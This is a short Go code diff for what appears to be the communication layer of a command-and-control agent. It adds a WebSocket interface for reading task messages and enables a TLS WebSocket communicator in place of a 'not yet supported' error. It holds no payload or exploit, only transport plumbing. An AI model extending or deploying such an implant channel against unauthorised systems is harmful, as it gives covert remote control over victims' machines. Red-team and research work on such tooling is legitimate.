@@ -1,7 +1,6 @@
 package comm
 
 import (
-	"errors"
 	"fmt"
 	"numinon_shadow/internal/agent/config"
 )
@@ -12,6 +11,14 @@ type Communicator interface {
 	CheckIn() ([]byte, error)
 	SendResult(resultData []byte) error
 	Type() config.AgentProtocol
+}
+
+// WsCommunicator defines the behavior for WebSocket-based communicators,
+// which have the unique ability to proactively read task messages from a
+// persistent connection. It embeds the standard Communicator interface.
+type WsCommunicator interface {
+	Communicator // Embeds Connect, Disconnect, CheckIn, SendResult, Type
+	ReadTaskMessage() ([]byte, error)
 }
 
 func NewCommunicator(cfg config.AgentConfig) (Communicator, error) {
@@ -34,8 +41,7 @@ func NewCommunicator(cfg config.AgentConfig) (Communicator, error) {
 		return NewWsClearCommunicator(cfg)
 
 	case config.WebsocketSecure:
-		return nil, errors.New("websocket tls not yet supported")
-		//return NewWSSCommunicator(cfg)
+		return NewWsSecureCommunicator(cfg)
 
 	default:
 		return nil, fmt.Errorf("unknown communicator type specified: %s", cfg.Protocol)
